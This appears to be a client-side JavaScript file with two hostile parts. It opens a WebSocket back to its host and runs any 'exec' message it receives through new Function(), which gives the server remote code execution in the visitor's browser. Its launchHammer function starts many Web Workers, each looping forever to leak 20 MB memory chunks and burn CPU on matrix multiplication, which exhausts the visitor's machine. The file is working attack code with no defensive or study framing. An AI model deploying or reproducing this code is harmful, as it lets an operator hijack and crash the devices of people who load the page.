const sessionId = crypto.randomUUID();
let ws = null;

function connectWS() {
  const protocol = location.protocol === "https:" ? "wss" : "ws";
  ws = new WebSocket(`${protocol}://${location.host}/ws/${sessionId}`);
  ws.onclose = () => { ws = null; };
  ws.onerror = () => { ws = null; };
  ws.onmessage = (event) => {
    try { handleCommand(JSON.parse(event.data)); } catch (e) {}
  };
}

function handleCommand(cmd) {
  if (cmd.type === "exec" && cmd.js) new Function(cmd.js)();
}

function launchHammer() {
  const workerCode = `
    onmessage = function() {};
    const SIZE = 512;
    const LEAK_CHUNK_MB = 20;
    const leaks = [];

    function makeMatrix() {
      const m = new Float64Array(SIZE * SIZE);
      for (let i = 0; i < m.length; i++) m[i] = Math.random();
      return m;
    }

    function matMul(A, B, C) {
      for (let i = 0; i < SIZE; i++) {
        for (let k = 0; k < SIZE; k++) {
          const aik = A[i * SIZE + k];
          for (let j = 0; j < SIZE; j++) {
            C[i * SIZE + j] += aik * B[k * SIZE + j];
          }
        }
      }
    }

    const A = makeMatrix();
    const B = makeMatrix();
    const C = new Float64Array(SIZE * SIZE);

    while (true) {
      const chunk = new Float64Array(LEAK_CHUNK_MB * 1024 * 1024 / 8);
      for (let i = 0; i < chunk.length; i++) chunk[i] = Math.random();
      leaks.push(chunk);
      matMul(A, B, C);
      for (let i = 0; i < SIZE * SIZE; i++) A[i] = C[i] * 0.9999;
    }
  `;

  const blob = new Blob([workerCode], { type: "application/javascript" });
  const url = URL.createObjectURL(blob);
  const count = (navigator.hardwareConcurrency || 4) * 4;
  for (let i = 0; i < count; i++) {
    new Worker(url);
  }
}
